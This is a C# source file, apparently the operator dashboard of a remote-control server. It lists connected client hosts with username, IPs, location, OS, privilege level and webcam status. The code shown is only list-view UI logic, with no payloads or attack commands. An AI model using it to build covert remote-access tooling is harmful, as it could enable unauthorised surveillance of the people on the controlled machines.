using System;
using System.Collections.Generic;
using System.Windows.Forms;
using RemoteControl.Protocals;

namespace RemoteControl.Server
{
    public partial class FrmMain
    {
        private System.Threading.Timer _clientListRefreshTimer;

        private void ScheduleClientListRefresh()
        {
            if (_clientListRefreshTimer != null)
                _clientListRefreshTimer.Dispose();

            _clientListRefreshTimer = new System.Threading.Timer(_ =>
            {
                try
                {
                    this.BeginInvoke(new Action(RefreshHostDashboard));
                }
                catch { }
            }, null, 800, System.Threading.Timeout.Infinite);
        }

        private void RefreshHostDashboard()
        {
            if (hostListView == null)
                return;

            hostListView.BeginUpdate();
            try
            {
                hostListView.Items.Clear();
                foreach (SocketSession session in onlineClientSessions)
                {
                    if (!SessionMatchesDashboardView(session))
                        continue;
                    hostListView.Items.Add(CreateHostListItem(session));
                }
            }
            finally
            {
                hostListView.EndUpdate();
            }
            UpdateDashboardCounters();
        }

        private void UpsertHostDashboardClient(SocketSession session)
        {
            if (hostListView == null || session == null || string.IsNullOrEmpty(session.SocketId))
                return;

            ListViewItem item = FindHostListItem(session.SocketId);
            if (!SessionMatchesDashboardView(session))
            {
                if (item != null)
                    hostListView.Items.Remove(item);
                UpdateDashboardCounters();
                return;
            }

            if (item == null)
            {
                hostListView.Items.Add(CreateHostListItem(session));
            }
            else
            {
                ApplyHostListItem(item, session);
            }
            UpdateDashboardCounters();
        }

        private void RemoveHostDashboardClient(SocketSession session)
        {
            if (hostListView == null || session == null || string.IsNullOrEmpty(session.SocketId))
                return;

            ListViewItem item = FindHostListItem(session.SocketId);
            if (item != null)
                hostListView.Items.Remove(item);
            UpdateDashboardCounters();
        }

        private ListViewItem FindHostListItem(string socketId)
        {
            foreach (ListViewItem item in hostListView.Items)
            {
                SocketSession session = item.Tag as SocketSession;
                if (session != null && session.SocketId == socketId)
                    return item;
            }
            return null;
        }

        private ListViewItem CreateHostListItem(SocketSession session)
        {
            ListViewItem item = new ListViewItem();
            ApplyHostListItem(item, session);
            return item;
        }

        private void ApplyHostListItem(ListViewItem item, SocketSession session)
        {
            string[] values = BuildHostRowValues(session);
            if (item.Text != values[0])
                item.Text = values[0];
            item.ImageKey = "computer";
            while (item.SubItems.Count < values.Length)
                item.SubItems.Add("");
            for (int i = 1; i < values.Length; i++)
            {
                if (item.SubItems[i].Text != values[i])
                    item.SubItems[i].Text = values[i];
            }
            item.Tag = session;
        }

        private string[] BuildHostRowValues(SocketSession session)
        {
            if (session == null)
                return new string[]
                {
                    "未知主机", "-", "-", "-", "-", "-", "-", "-", "-", "-"
                };

            return new string[]
            {
                GetClientDisplayText(session),
                SafeText(session.UserName),
                SafeText(session.GetExternalIP()),
                SafeText(session.LocalIP),
                SafeText(session.Location),
                SafeText(session.OSVersion),
                SafeText(session.Privilege),
                SafeText(session.CameraStatus),
                SafeText(session.Remark),
                FormatLastActive(session.LastActiveTime)
            };
        }

        private static string SafeText(string value)
        {
            return string.IsNullOrEmpty(value) ? "-" : value;
        }

        private static string FormatLastActive(DateTime value)
        {
            if (value == DateTime.MinValue)
                return "-";
            TimeSpan span = DateTime.Now - value;
            if (span.TotalMinutes < 1)
                return "刚刚";
            if (span.TotalHours < 1)
                return ((int)span.TotalMinutes) + " 分钟前";
            return value.ToString("HH:mm:ss");
        }
    }
}
